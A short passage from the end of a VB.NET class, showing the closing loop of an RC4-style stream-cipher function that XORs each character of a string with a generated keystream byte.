            i = (i + 1) And 255
            j = (j + s(i)) And 255
            Dim temp = s(i)
            s(i) = s(j)
            s(j) = temp
            sb.Append(Chr(s((s(i) + s(j)) And 255) Xor Asc(c)))
        Next
        Return sb.ToString
    End Function


#End Region



End Class